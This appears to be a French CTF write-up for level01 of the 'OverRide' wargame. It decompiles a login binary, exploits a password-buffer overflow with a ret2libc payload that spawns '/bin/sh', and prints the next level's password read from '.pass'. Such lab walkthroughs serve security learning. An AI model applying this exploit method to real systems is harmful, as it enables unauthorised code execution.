# **Level 01**

Premiere etape, comprendre le programme, on va donc decompiler l'executable dans un premier temps.

```
int verify_user_name(void)

{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined uVar4;
  undefined uVar5;
  byte bVar6;
  
  bVar6 = 0;
  uVar4 = &stack0xfffffff4 < (undefined *)0x10;
  uVar5 = &stack0x00000000 == (undefined *)0x1c;
  puts("verifying username....\n");
  iVar1 = 7;
  pbVar2 = &a_user_name;
  pbVar3 = (byte *)"dat_wil";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    uVar4 = *pbVar2 < *pbVar3;
    uVar5 = *pbVar2 == *pbVar3;
    pbVar2 = pbVar2 + (uint)bVar6 * -2 + 1;
    pbVar3 = pbVar3 + (uint)bVar6 * -2 + 1;
  } while ((bool)uVar5);
  return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
}



int verify_user_pass(byte *param_1)

{
  int iVar1;
  byte *pbVar2;
  undefined in_CF;
  undefined in_ZF;
  
  iVar1 = 5;
  pbVar2 = (byte *)"admin";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    in_CF = *param_1 < *pbVar2;
    in_ZF = *param_1 == *pbVar2;
    param_1 = param_1 + 1;
    pbVar2 = pbVar2 + 1;
  } while ((bool)in_ZF);
  return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
}



undefined4 main(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 local_54 [16];
  int local_14;
  
  puVar3 = local_54;
  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_14 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name,0x100,stdin);
  local_14 = verify_user_name();
  if (local_14 == 0) {
    puts("Enter Password: ");
    fgets((char *)local_54,100,stdin);
    local_14 = verify_user_pass(local_54);
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
    else {
      uVar1 = 0;
    }
  }
  else {
    puts("nope, incorrect username...\n");
    uVar1 = 1;
  }
  return uVar1;
}
```
On peut donc voir que le programme nous demande un `prompt` d'un `username` puis un prompt pour un `password`;
Testons donc le programme,
```
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: test
verifying username....

nope, incorrect username...

```
En examinant un peu mieux le code, on peut voir que le `username` attendu est `dat_wil`
```
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
test
nope, incorrect password...
```

De plus, on constate que le `buffer` de la variable contenant le `password` est de `16` et que,
si l'on remplie le buffer de `80 characteres`, on `sigsegv`
```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
01234567890123456789012345678901234567890123456789012345678901234567890123456789
nope, incorrect password...

Segmentation fault (core dumped)
```
Notre objectif va donc d'utiliser la place disponible dans le buffer de password pour reecrire le return du main
Exploit -> `Ret2libc`

> Pour une rapide explication ce au'on appelle `ret2libc` est un exploit utilisant `eip` pour jump dans la fonction `system` avec pour argument la commande voulu, ici `/bin/sh`
> Pour plus d'info [How to perform a ret2libc attack](https://shellblade.net/files/docs/ret2libc.pdf)

Pour ce faire nous allons devoir trouver l'`adresse` de la `fonction system` et une adresse d'une `string` contenant `/bin/sh`
```
level01@OverRide:~$ gdb ./level01 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80484d5
(gdb) run
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d5 in main ()
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
```
Adresse de system -> `0xf7e6aed0`

```
(gdb) find __libc_start_main, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```
Adresse de "bin/sh" -> `0xf7f897ec`

Nous pouvons donc maintenant creer notre payload:

premier prompt -> [dat_wil]

second prompt -> [80 characteres] [addr system] [4 characteres] [addr "/bin/sh"]

`(python -c "print 'dat_wil'"; python -c "print '\x90'*80 + '\xd0\xae\xe6\xf7' + 'AAAA'+ '\xec\x97\xf8\xf7'") > /var/crash/file`

```
level01@OverRide:~$ (python -c "print 'dat_wil'"; python -c "print '\x90'*80 + '\xd0\xae\xe6\xf7' + 'AAAA'+ '\xec\x97\xf8\xf7'") > /var/crash/file
level01@OverRide:~$ cat /var/crash/file - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
> ### NEXT : [Level 02](/level02/resources/README.md)
